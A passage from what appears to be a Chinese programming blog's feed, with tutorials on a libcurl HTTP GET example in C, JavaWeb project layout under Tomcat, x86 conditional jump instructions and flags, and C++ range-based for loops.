class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">response</span> <span class="title">Response</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">response</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_callback</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userdata)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> total_size = size * nmemb;</span><br><span class="line"></span><br><span class="line">    Response* response = (Response*)userdata;</span><br><span class="line">    <span class="type">char</span>* p = <span class="built_in">realloc</span>(response-&gt;data, response-&gt;size + total_size + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> CURL_WRITEFUNC_ERROR;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        response-&gt;data = p;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;(response-&gt;data[response-&gt;size]), ptr, total_size);</span><br><span class="line">    response-&gt;size += total_size;</span><br><span class="line">    response-&gt;data[response-&gt;size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CURL* curl;</span><br><span class="line">    CURLcode code;</span><br><span class="line"></span><br><span class="line">    Response response;</span><br><span class="line">    response.data = (byte*)<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    response.size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    curl = curl_easy_init();</span><br><span class="line">    <span class="keyword">if</span> (curl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Curl Init Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_URL, <span class="string">&quot;http://www.httpbin.org/get?hello=world&quot;</span>);</span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);</span><br><span class="line">    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &amp;response);</span><br><span class="line"></span><br><span class="line">    code = curl_easy_perform(curl);</span><br><span class="line">    <span class="keyword">if</span> (code != CURLE_OK) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Curl Perform Error: %s&quot;</span>, curl_easy_strerror(code));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%sResponse-Size: %d\n&quot;</span>, response.data, response.size);</span><br><span class="line">    <span class="built_in">free</span>(response.data);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> url[] = <span class="string">&quot;Hello World %%#*&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* encoded_url = curl_easy_escape(curl, url, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (encoded_url == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;URL Encode Fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;url: %s\n&quot;</span>, url);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;encoded_url: %s&quot;</span>, encoded_url);</span><br><span class="line"></span><br><span class="line">    curl_free(encoded_url);</span><br><span class="line">    curl_easy_cleanup(curl);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb项目结构解析</title>
      <link href="/2024/10/28/JavaWeb%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/"/>
      <url>/2024/10/28/JavaWeb%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>环境：</p><ul><li><code>Eclipse</code>: 2023-12</li><li><code>Maven</code>: apache-maven-3.6.1</li><li><code>Tomcat</code>: apache-tomcat-9.0.86</li><li>JDK: 11.0.18</li></ul><p>本次的项目为制作一个简易登录系统，项目名称为 <strong>login-system</strong></p><p>选择的项目骨架(archetype)是</p><table><thead><tr><th>Group Id</th><th>Artifact Id</th><th>Version</th></tr></thead><tbody><tr><td>org.apache.maven.archetypes</td><td>maven-archetype-webapp</td><td>1.0</td></tr></tbody></table><p>第一次创建后的项目目录结构如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">login-system</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   └── main</span><br><span class="line">│       ├── resources</span><br><span class="line">│       └── webapp</span><br><span class="line">│           ├── index.jsp</span><br><span class="line">│           └── WEB-INF</span><br><span class="line">│               └── web.xml</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>其中这个target目录没什么用，暂时不考虑</p><p>这些目录有什么作用呢，等会讲</p><p>其实这个骨架并不完整，我们还需要添加自己添加一些目录使其完整</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">login-system</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   └── main</span><br><span class="line">│       ├── java</span><br><span class="line">│       │    └── servlet</span><br><span class="line">│       │        ├── HelloServlet.java</span><br><span class="line">│       │        └── LoginServlet.java</span><br><span class="line">│       ├── resources</span><br><span class="line">│       └── webapp</span><br><span class="line">│           ├── index.jsp</span><br><span class="line">│           └── WEB-INF</span><br><span class="line">│               └── web.xml</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>像这样，其实只是在<code>login-system/src/main/</code>目录下添加了一个<code>java</code>目录，在整个项目中这个目录会被自动标记为 <strong>Source Folder</strong> 也就是java编译的起点就是在这里（后面web.xml中配置&lt;servlet&gt;的&lt;servlet-class&gt;也是以这个目录为起点）。其实呢，如果不添加这个目录，<code>eclipse</code>还不让你新建 <strong>Servlet</strong>，它指明了需要在一个<code>java</code>目录下写 <strong>Servlet</strong></p><p>(好像完整的骨架在 main目录下还有个 test目录，自己加一下吧)</p><blockquote><p>在  .&#x2F;src&#x2F;main目录下新建的目录都会被自动标记为 <strong>Source Folder</strong>，此后这些目录下的 .java文件都被编译为 .class文件，然后存放在 tomcat&#x2F;webapps&#x2F;[webapp]&#x2F;WEB-INF&#x2F;classes目录下<br>当然，resources作为 <strong>Source Folder</strong>，其目录下的资源文件会被直接放在classes目录下</p></blockquote><p>然后我还添加了一个<code>servlet</code>包，目的是为了分类，在这个包下的类都是 <strong>Servlet</strong>类</p><p>在了解整个项目各个目录，各个文件夹的作用前，我们需要先了解<code>tomcat</code>目录下各个文件夹的作用，因为整个项目最终是要部署在<code>tomcat</code>下的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tomcat</span><br><span class="line">├── conf</span><br><span class="line">├── logs</span><br><span class="line">├── temp</span><br><span class="line">├── work</span><br><span class="line">└── webapps</span><br><span class="line">    ├── ROOT</span><br><span class="line">    └── login-system</span><br></pre></td></tr></table></figure><p>这里为了更好的解释，我对整个<code>tomcat</code>的项目结构做了删改和顺序调整，<code>tomcat</code>下的一级目录以及各个作用这里我就不多做解释，我们这次的重点是<code>webapps</code>目录</p><p>在这个目录下除了自带的<code>ROOT</code>目录外还有刚刚创建的<code>login-system</code>项目，这里我要挑明的说</p><p><code>tomcat</code>为什么称为容器，我觉得关键就在于这个<code>webapps</code>目录。我们写的项目可以说是一个<strong>webapp</strong>，这个 <strong>webapp</strong>需要依托在<code>tomcat</code>下才能展示出来，一个<code>tomcat</code>不可能只运行一个 <strong>webapp</strong>，那样太浪费资源了，所以从这里可以看出来，一个<code>tomcat</code>可以运行多个 <strong>webapp</strong>，在这里<code>ROOT</code>是一个 <strong>webapp</strong>，<code>login-system</code>也是一个 <strong>webapp</strong>，它们都被放在<code>tomcat</code>的<code>webapps</code>目录下。</p><p>这些 <strong>webapp</strong>被挂在了<code>tomcat</code>的<code>webapps</code>中，所以说<code>tomcat</code>是一个容器，它容纳了这些 <strong>webapp</strong></p><p>让我们仔细看一下这个文件目录结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">webapps</span><br><span class="line">├── login-system</span><br><span class="line">│   ├── index.jsp</span><br><span class="line">│   ├── META-INF</span><br><span class="line">│   └── WEB-INF</span><br><span class="line">│       ├── classes</span><br><span class="line">│       │   └── servlet</span><br><span class="line">│       │       ├── HelloServlet.class</span><br><span class="line">│       │       └── LoginServlet.class</span><br><span class="line">│       └── web.xml</span><br><span class="line">└── ROOT</span><br><span class="line">    └── WEB-INF</span><br><span class="line">        └── web.xml</span><br></pre></td></tr></table></figure><p>将其中的<code>login-system</code>模块与我们的源项目进行比较</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">login-system</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   └── main</span><br><span class="line">│       ├── java</span><br><span class="line">│       │    └── servlet</span><br><span class="line">│       │        ├── HelloServlet.java</span><br><span class="line">│       │        └── LoginServlet.java</span><br><span class="line">│       ├── resources</span><br><span class="line">│       └── webapp</span><br><span class="line">│           ├── index.jsp</span><br><span class="line">│           └── WEB-INF</span><br><span class="line">│               └── web.xml</span><br><span class="line">└── target</span><br></pre></td></tr></table></figure><p>会发现极其的相似，这个转化过程是这样的。</p><p>我们写一个项目，总会有一个输出结果，而现在这个项目输出结果的重点就是 <code>webapp</code>目录</p><p>在转换为能够挂载在<code>tomcat</code>下的 <strong>webapp</strong>前，<code>eclipse</code>做的工作就是处理<code>java</code>目录（所有 <strong>Source Folder</strong>），将这里面的 .java文件全部编译为 .class文件后把这些字节码文件一起存放在一个新建的<code>classes</code>目录下，保持原先各个包的结构，然后将整个 <code>classes</code>目录移到与<code>main</code>同级的<code>webapp</code>目录下的<code>WEB-INF</code>目录下。然后将我们写的项目中的<code>webapp</code>目录提取出来，把这个目录名改为项目名。最后把这个<code>login-system</code>目录作为一个 <strong>webapp</strong>迁移到 <code>tomcat</code>的<code>webapps</code>目录下</p><p>这是项目的最终结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">login-system/</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    ├── main</span><br><span class="line">    │   ├── java</span><br><span class="line">    │   │   ├── pojo</span><br><span class="line">    │   │   │   ├── UserDB.java</span><br><span class="line">    │   │   │   └── User.java</span><br><span class="line">    │   │   ├── servlet</span><br><span class="line">    │   │   │   ├── IndexServlet.java</span><br><span class="line">    │   │   │   ├── LoginServlet.java</span><br><span class="line">    │   │   │   └── LogoutServlet.java</span><br><span class="line">    │   │   └── xmlParse</span><br><span class="line">    │   │       ├── UserXMLHandler.java</span><br><span class="line">    │   │       └── XMLParser.java</span><br><span class="line">    │   ├── resources</span><br><span class="line">    │   │   └── UserDB.xml</span><br><span class="line">    │   └── webapp</span><br><span class="line">    │       ├── css</span><br><span class="line">    │       │   ├── index.css</span><br><span class="line">    │       │   └── login.css</span><br><span class="line">    │       ├── index.jsp</span><br><span class="line">    │       ├── js</span><br><span class="line">    │       │   └── index.js</span><br><span class="line">    │       ├── login.html</span><br><span class="line">    │       └── WEB-INF</span><br><span class="line">    │           └── web.xml</span><br><span class="line">    └── test</span><br><span class="line">        ├── java</span><br><span class="line">        └── resources</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后挂载到tomcat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">webapps/</span><br><span class="line">├── login-system</span><br><span class="line">│   ├── css</span><br><span class="line">│   │   ├── index.css</span><br><span class="line">│   │   └── login.css</span><br><span class="line">│   ├── index.jsp</span><br><span class="line">│   ├── js</span><br><span class="line">│   │   └── index.js</span><br><span class="line">│   ├── login.html</span><br><span class="line">│   ├── META-INF</span><br><span class="line">│   │   ├── MANIFEST.MF</span><br><span class="line">│   │   └── maven</span><br><span class="line">│   │       └── com.kyzen</span><br><span class="line">│   │           └── login-system</span><br><span class="line">│   │               ├── pom.properties</span><br><span class="line">│   │               └── pom.xml</span><br><span class="line">│   └── WEB-INF</span><br><span class="line">│       ├── classes</span><br><span class="line">│       │   ├── pojo</span><br><span class="line">│       │   │   └── User.class</span><br><span class="line">│       │   ├── servlet</span><br><span class="line">│       │   │   ├── IndexServlet.class</span><br><span class="line">│       │   │   ├── LoginServlet.class</span><br><span class="line">│       │   │   └── LogoutServlet.class</span><br><span class="line">│       │   ├── UserDB.xml</span><br><span class="line">│       │   └── xmlParse</span><br><span class="line">│       │       ├── UserXMLHandler.class</span><br><span class="line">│       │       └── XMLParser.class</span><br><span class="line">│       └── web.xml</span><br><span class="line">└── ROOT</span><br><span class="line">    └── WEB-INF</span><br><span class="line">        └── web.xml</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JCC跳转指令和状态寄存器</title>
      <link href="/2024/10/24/JCC%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E5%92%8C%E7%8A%B6%E6%80%81%E5%AF%84%E5%AD%98%E5%99%A8/"/>
      <url>/2024/10/24/JCC%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E5%92%8C%E7%8A%B6%E6%80%81%E5%AF%84%E5%AD%98%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>在x86汇编语言中，JCC指令（条件跳转指令）是一组基于条件标志寄存器（EFLAGS）中的状态来决定是否跳转到某个地址的指令。下面是所有JCC指令及其对应的条件标志和含义。</p><h3 id="状态寄存器（EFLAGS）"><a href="#状态寄存器（EFLAGS）" class="headerlink" title="状态寄存器（EFLAGS）"></a>状态寄存器（EFLAGS）</h3><p>EFLAGS寄存器中包含了一些标志位，这些标志位用于指示上一次操作的结果，并用于控制条件跳转指令。常见的标志位有：</p><ul><li><strong>CF (Carry Flag)</strong>：进位标志。如果运算结果有进位或者借位，CF置1。</li><li><strong>PF (Parity Flag)</strong>：奇偶标志。如果结果的低8位中1的个数为偶数，PF置1。</li><li><strong>AF (Auxiliary Carry Flag)</strong>：辅助进位标志。用于BCD运算。</li><li><strong>ZF (Zero Flag)</strong>：零标志。如果运算结果为0，ZF置1。</li><li><strong>SF (Sign Flag)</strong>：符号标志。如果运算结果为负数，SF置1。</li><li><strong>OF (Overflow Flag)</strong>：溢出标志。如果有符号数运算溢出，OF置1。</li></ul><h3 id="JCC指令详解"><a href="#JCC指令详解" class="headerlink" title="JCC指令详解"></a>JCC指令详解</h3><p>JCC指令通常有两个字节，第一个字节是0x0F，第二个字节表示具体的跳转条件。下面是所有的JCC指令及其对应的条件和标志位。</p><table><thead><tr><th>指令</th><th>条件</th><th>标志位</th><th>描述</th></tr></thead><tbody><tr><td>JO</td><td>Overflow</td><td>OF&#x3D;1</td><td>如果溢出</td></tr><tr><td>JNO</td><td>Not Overflow</td><td>OF&#x3D;0</td><td>如果不溢出</td></tr><tr><td>JB, JNAE, JC</td><td>Below, Not Above or Equal, Carry</td><td>CF&#x3D;1</td><td>如果进位</td></tr><tr><td>JAE, JNB, JNC</td><td>Above or Equal, Not Below, Not Carry</td><td>CF&#x3D;0</td><td>如果不进位</td></tr><tr><td>JE, JZ</td><td>Equal, Zero</td><td>ZF&#x3D;1</td><td>如果相等&#x2F;结果为零</td></tr><tr><td>JNE, JNZ</td><td>Not Equal, Not Zero</td><td>ZF&#x3D;0</td><td>如果不相等&#x2F;结果不为零</td></tr><tr><td>JBE, JNA</td><td>Below or Equal, Not Above</td><td>CF&#x3D;1 or ZF&#x3D;1</td><td>如果低于或等于</td></tr><tr><td>JA, JNBE</td><td>Above, Not Below or Equal</td><td>CF&#x3D;0 and ZF&#x3D;0</td><td>如果高于</td></tr><tr><td>JS</td><td>Sign</td><td>SF&#x3D;1</td><td>如果结果为负</td></tr><tr><td>JNS</td><td>Not Sign</td><td>SF&#x3D;0</td><td>如果结果为正</td></tr><tr><td>JP, JPE</td><td>Parity, Parity Even</td><td>PF&#x3D;1</td><td>如果奇偶为偶数</td></tr><tr><td>JNP, JPO</td><td>Not Parity, Parity Odd</td><td>PF&#x3D;0</td><td>如果奇偶为奇数</td></tr><tr><td>JL, JNGE</td><td>Less, Not Greater or Equal</td><td>SF≠OF</td><td>如果小于</td></tr><tr><td>JGE, JNL</td><td>Greater or Equal, Not Less</td><td>SF&#x3D;OF</td><td>如果大于或等于</td></tr><tr><td>JLE, JNG</td><td>Less or Equal, Not Greater</td><td>ZF&#x3D;1 or SF≠OF</td><td>如果小于或等于</td></tr><tr><td>JG, JNLE</td><td>Greater, Not Less or Equal</td><td>ZF&#x3D;0 and SF&#x3D;OF</td><td>如果大于</td></tr></tbody></table><h3 id="结合状态寄存器和JCC指令的表格"><a href="#结合状态寄存器和JCC指令的表格" class="headerlink" title="结合状态寄存器和JCC指令的表格"></a>结合状态寄存器和JCC指令的表格</h3><p>下表列出了JCC指令与EFLAGS寄存器标志位的关系：</p><table><thead><tr><th>指令</th><th>条件</th><th>OF</th><th>CF</th><th>ZF</th><th>SF</th><th>PF</th><th>描述</th></tr></thead><tbody><tr><td>JO</td><td>Overflow</td><td>1</td><td></td><td></td><td></td><td></td><td>如果溢出</td></tr><tr><td>JNO</td><td>Not Overflow</td><td>0</td><td></td><td></td><td></td><td></td><td>如果不溢出</td></tr><tr><td>JB, JNAE, JC</td><td>Below, Not Above or Equal, Carry</td><td></td><td>1</td><td></td><td></td><td></td><td>如果进位</td></tr><tr><td>JAE, JNB, JNC</td><td>Above or Equal, Not Below, Not Carry</td><td></td><td>0</td><td></td><td></td><td></td><td>如果不进位</td></tr><tr><td>JE, JZ</td><td>Equal, Zero</td><td></td><td></td><td>1</td><td></td><td></td><td>如果相等&#x2F;结果为零</td></tr><tr><td>JNE, JNZ</td><td>Not Equal, Not Zero</td><td></td><td></td><td>0</td><td></td><td></td><td>如果不相等&#x2F;结果不为零</td></tr><tr><td>JBE, JNA</td><td>Below or Equal, Not Above</td><td></td><td>1</td><td>1</td><td></td><td></td><td>如果低于或等于</td></tr><tr><td>JA, JNBE</td><td>Above, Not Below or Equal</td><td></td><td>0</td><td>0</td><td></td><td></td><td>如果高于</td></tr><tr><td>JS</td><td>Sign</td><td></td><td></td><td></td><td>1</td><td></td><td>如果结果为负</td></tr><tr><td>JNS</td><td>Not Sign</td><td></td><td></td><td></td><td>0</td><td></td><td>如果结果为正</td></tr><tr><td>JP, JPE</td><td>Parity, Parity Even</td><td></td><td></td><td></td><td></td><td>1</td><td>如果奇偶为偶数</td></tr><tr><td>JNP, JPO</td><td>Not Parity, Parity Odd</td><td></td><td></td><td></td><td></td><td>0</td><td>如果奇偶为奇数</td></tr><tr><td>JL, JNGE</td><td>Less, Not Greater or Equal</td><td>0&#x2F;1</td><td></td><td></td><td>0&#x2F;1</td><td></td><td>如果小于</td></tr><tr><td>JGE, JNL</td><td>Greater or Equal, Not Less</td><td>0&#x2F;1</td><td></td><td></td><td>0&#x2F;1</td><td></td><td>如果大于或等于</td></tr><tr><td>JLE, JNG</td><td>Less or Equal, Not Greater</td><td>0&#x2F;1</td><td></td><td>1</td><td>0&#x2F;1</td><td></td><td>如果小于或等于</td></tr><tr><td>JG, JNLE</td><td>Greater, Not Less or Equal</td><td>0&#x2F;1</td><td></td><td>0</td><td>0&#x2F;1</td><td></td><td>如果大于</td></tr></tbody></table><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul><li>当OF和SF相等时，表示无符号数比较结果的正负号。</li><li>CF和ZF组合起来可以判断无符号数的大小关系。</li><li>PF用于判断结果的奇偶性，主要用于一些特定的算法。</li></ul><p>这样，通过结合EFLAGS寄存器的标志位和JCC指令，程序可以实现各种条件的跳转控制。</p><hr><blockquote><p>补码是C语言层面将”-1”存入内存的方式。以什么方式将数字转化为机器码存储，将机器码解释为什么数字，是由C语言来定义的。计算机只处理交过来的机器码，以及交给C语言对应的机器码。</p><p>CPU运算时管你有符号，无符号，也不管是否会溢出，只管对应位相加</p><p>但会产生两套比较逻辑和溢出逻辑，一个有符号，一个无符号</p><p>存储在PSW中</p><p>由C语言自己选择JBE(无符号跳转)和JLE(有符号跳转)</p><p>来区分有符号比较和无符号比较</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++范围for语句</title>
      <link href="/2024/09/28/C++Primer-%E8%8C%83%E5%9B%B4for%E8%AF%AD%E5%8F%A5/"/>
      <url>/2024/09/28/C++Primer-%E8%8C%83%E5%9B%B4for%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="范围for语句"><a href="#范围for语句" class="headerlink" title="范围for语句"></a>范围for语句</h1><p><code>C++11</code>标准引入了一种更简单的 for 语句，也就是<strong>范围 for 语句</strong>，或者说 <strong>for-in 循环</strong>，其基本的用法与其它语言差不多：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Type element : container)</span><br><span class="line">    <span class="comment">// do sth. on element</span></span><br></pre></td></tr></table></figure><p>从结果上来说，这种循环语句是<code>C++11</code>提供的语法糖，想要正确的使用它，我们还需要了解其底层机制是怎么样的。</p><p>在**《C++ Primer》第5版**，<strong>第168页5.4.3</strong>中提给出如下示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; vec = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"><span class="comment">// 范围变量必须是引用类型，这样才能对元素执行写操作</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;r : v)</span><br><span class="line">    r *= <span class="number">2</span>; <span class="comment">// 将v中每个元素的值翻倍</span></span><br></pre></td></tr></table></figure><p>范围 for 语句的定义来源于与之等价的传统 for 语句：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> beg = v.<span class="built_in">begin</span>(), end = v.<span class="built_in">end</span>(); beg != end; ++beg) &#123;</span><br><span class="line">    <span class="keyword">auto</span> &amp;r = *beg; <span class="comment">// r 必须是引用类型，这样才能对元素执行写操作</span></span><br><span class="line">    r *= <span class="number">2</span>; <span class="comment">// 将v中每个元素的值翻倍</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们也就清楚了，为什么原来的范围 for 循环在定义 <strong>r</strong> 变量时需要使用引用。从传统 for 循环来看，原来在范围 for 小括号里定义的 <strong>r</strong> 变量被移到循环体内定义，在头部重新定义 2 个容器的迭代器 **beg **和 <strong>end</strong> ，分别指向容器的开头和”结尾“，整个循环由这 2 个迭代器来控制，每次循环变量 <strong>r</strong> 都会根据迭代器(<strong>beg</strong>)指向的元素重新赋值，然后对变量 <strong>r</strong> 执行一些操作。</p><p>为了加深印象和验证这种转换，我们可以自己实现一个可以用于范围 for 循环的类。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Container</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">size_t</span> size = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> arr[size] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span>* ptr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Iterator</span>(<span class="type">int</span>* ptr) &#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;ptr = ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>&amp; <span class="keyword">operator</span>*() &#123;</span><br><span class="line">            <span class="keyword">return</span> *ptr;</span><br><span class="line">        &#125;</span><br><span class="line">Iterator <span class="keyword">operator</span>++() &#123;</span><br><span class="line">    ptr++;</span><br><span class="line"><span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> Iterator&amp; other) <span class="type">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ptr != other.ptr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Iterator <span 